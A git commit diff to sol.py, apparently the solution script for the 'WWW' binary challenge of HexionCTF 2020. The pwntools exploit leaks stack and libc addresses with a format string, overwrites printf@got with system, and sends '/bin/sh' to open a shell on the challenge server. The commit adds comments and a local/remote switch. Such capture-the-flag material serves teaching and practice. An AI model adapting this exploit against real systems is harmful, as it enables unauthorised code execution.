a2258f63be6b2edcadc542c46aedf2a382c19ed5
HexionTeam <62445538+HexionTeam@users.noreply.github.com>
2020-04-13 03:31:08 +0100

    Update sol.py

--- HexionCTF 2020 Online/WWW/sol.py
+++ HexionCTF 2020 Online/WWW/sol.py
@@ -1,6 +1,7 @@
 from pwn import *
 
-p = remote('challenges1.hexionteam.com', 3002) #
+local = False
+p = process('./www') if local else remote('challenges1.hexionteam.com', 3002)
 
 elf = ELF('./www')
 main_func = elf.functions['main'] 
@@ -14,24 +15,24 @@ def write(what, where, last=False):
 	print(msg)
 	p.send(msg)
 
-# ret to ret (because io function alignment) and then to main, leak printf address and stack
-write(p64(elf.got['printf']), 0x2d + 16)
-write(p64(main_func.address), 0x2d + 8)
-write(p64(main_func.address + main_func.size - 1), 0x2d) # ret
-write(b"%10$llx %15$s\x00", 0, True) # LEAK
-
+# ret to ret (because stack alignment) and then to main, also leak printf got entry and stack mapping
+write(p64(elf.got['printf']), 0x2d + 16) # printf got addr for leak
+write(p64(main_func.address), 0x2d + 8) # RIP(2) -> ret back to main
+write(p64(main_func.address + main_func.size - 1), 0x2d) # RIP(1) -> ret to ret
+write(b"%10$llx %15$s\x00", 0, True) # leak stack and libc
 
 # process leaks
 leak = p.recv().split()
-buff_start = int(leak[0], 16) - 245
-offset = buff_start - elf.got['printf']
+buff_start = int(leak[0], 16) - 245 		# beginning user input buffer
+offset = buff_start - elf.got['printf'] 	# distance between start of buffer to printf@got
 printf_addr = int.from_bytes(leak[1], 'little')
 
+# calculate system address using leaks
 lib = ELF('./libc')
 sys_addr = printf_addr + (lib.functions['system'].address - lib.functions['printf'].address)
 print(hex(buff_start), hex(printf_addr), hex(sys_addr), leak)
 
-# write sys address into printf reloc table
+# write address of system into printf@got
 write(p64(sys_addr)[:3], -offset)
 write(b'/bin/sh\x00', 0, True)
 p.interactive()
